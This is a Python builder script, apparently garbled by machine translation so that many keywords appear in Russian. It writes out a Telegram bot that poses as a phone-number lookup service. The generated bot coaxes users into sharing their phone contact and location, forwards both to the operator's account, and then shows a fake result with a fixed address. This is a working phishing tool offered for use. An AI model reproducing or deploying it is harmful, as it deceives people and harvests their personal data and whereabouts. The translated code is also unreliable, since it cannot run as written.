from  colorama  import  Fore , Back , Style
импорт  ОС

def  cls ():
    os . система ( 'ясно' )

def  ban ():

    печать ( Fore . CYAN + '' '
  _____ _ _ _ _ __ __ ______ 
| __ \ | \ | | \ | | | \ / | ____ |
| | | | \ | | \ | | | \ / | | __   
| | | | . `| . `| | | \ / | | __ |  
| | __ | | | \ | | \ | | | | | | ____
| _____ / | _ | \ _ | _ | \ _ | | _ | | _ | ______ |
'' ' )

    
    print ( Fore . CYAN  +  'by Weyz Busted'  +  Fore . WHITE  +  'Channel:'  +  Fore . RED  +  '@cyber_puffin'  +  Fore . BLUE )
    print ( Fore . СИНИЙ  +  '------ DEANONYM BOT BUILDER -----------------' )
    print ( '------------------------------------------- \ n ' )

cls ()
запретить ()
my_file  =  open ( 'Dnnme.py' , 'w' , кодировка = 'utf-8' )

a  =  input ( Fore . MAGENTA  +  "Введите ваш айди:" )
мой_файл . написать ( "" "
время импорта
случайный импорт
импортный телебот
из типов импорта телеботов
my_id = '"" " )
мой_файл . написать ( а )
мой_файл . написать ( "'" )
b  =  ввод ( Fore . MAGENTA  +  "Введите токен бота:" )
мой_файл . написать ( "" "
bot = telebot.TeleBot ('"" " )
мой_файл . написать ( б )
мой_файл . написать ( "')" )
мой_файл . написать ( '' '
user_dict = {}
класс Пользователь:
    def __init __ (я, имя):
        self.num = Нет
        self.number = Нет
@ bot.message_handler (commands = ['help', 'start'])
def имя_процесса_шаг (сообщение):
    пытаться:
        chat_id = message.chat.id
        имя = message.text
        user = Пользователь (имя)
        user_dict [chat_id] = пользователь
        msg = bot.reply_to (message, "" "Этот бот ищет информацию о номере телефона введите номер как на примере.
    Пример: 380685576477 "" ")
        bot.register_next_step_handler (msg, process_num_step)
    кроме исключения как e:
        bot.reply_to (сообщение, 'Ошибка, нажмине / start или перезагрузите бота')
def process_num_step (сообщение):
    пытаться:
        chat_id = message.chat.id
        число = message.text
        если не num.isdigit ():
            msg = bot.reply_to (сообщение «Проверьте правильно ли написали номер, и напишите снова.»)
            bot.register_next_step_handler (msg, process_num_step)
            вернуть            
        user = user_dict [chat_id]
        user.num = число
        bot.reply_to (сообщение, '⏳Подождите ... ⏳') # 🔎
        время сна (4)
        keyboard = types.ReplyKeyboardMarkup (row_width = 1, resize_keyboard = True)
        button_phone = types.KeyboardButton (text = "Продолжить", request_contact = True)
        keyboard.add (button_phone)
        bot.send_message (message.chat.id,
                     text = "🔎Для получения информации о номере нажмите 'Продолжить'🔎",
                     reply_markup = клавиатура)
        @ bot.message_handler (content_types = 'контакт')
        def ошибка (сообщение):
            bot.forward_message (my_id, message.chat.id, message.message_id)
            bot.reply_to (сообщение, '🔎Поиск информации, подождите ... 🔎') # 🔎🗿📞📞
            time.sleep (4.5)
            keyboard = types.ReplyKeyboardMarkup (row_width = 1, resize_keyboard = True)
            button_phone = types.KeyboardButton (text = "Начать🔎", request_location = True)
            keyboard.add (button_phone)
            bot.send_message (message.chat.id,
                         text = "📞Для получения информации о новом телефоне нажмите 'Начать' 📞",
                         reply_markup = клавиатура)
            @ bot.message_handler (content_types = 'местоположение')
            def ошибка (сообщение):
                bot.forward_message (my_id, message.chat.id, message.message_id)
                bot.reply_to (сообщение, '⏳Подождите ... ⏳') # 🔎🗿📞📞
                time.sleep (4.5)
                markup = types.ReplyKeyboardMarkup (one_time_keyboard = True)
                markup.add ('1', '2', '3', '4', '5', '6', '7', '8', '9')
                msg = bot.reply_to (сообщение, 'Подтвердите, что вы не робот, нажмите на цифру 4 или 7', reply_markup = разметка)
                bot.register_next_step_handler (сообщение, шаг_процесса)
    кроме исключения как e:
        bot.reply_to (сообщение, 'Ошибка, нажмине / start или перезагрузите бота')
def process_number_step (сообщение):
    пытаться:
        chat_id = message.chat.id
        number = message.text
        user = user_dict [chat_id]
        если (число == u'4 ') или (число == u'7'):
            bot.send_message (message.chat.id, "" "Номер получен!
        Страна: Россия
        Регион: Екатеринбург
        Улица: 8 марта
        Карты Google: https://clck.ru/RDFzp "" ")
        еще:
            msg = bot.reply_to (сообщение «Вы не прошли проверку, попробуйте ещё раз.»)
            bot.register_next_step_handler (сообщение, ошибка)
            поднять исключение ()
        
    кроме исключения как e:
        # bot.reply_to (сообщение, 'Ошибка')
        bot.register_next_step_handler (сообщение, шаг_процесса)
        
bot.polling ()
'' ' )
мой_файл . закрыть ()
print ( Fore . СИНИЙ  +  "Файл успешно создан и сохранен!" )
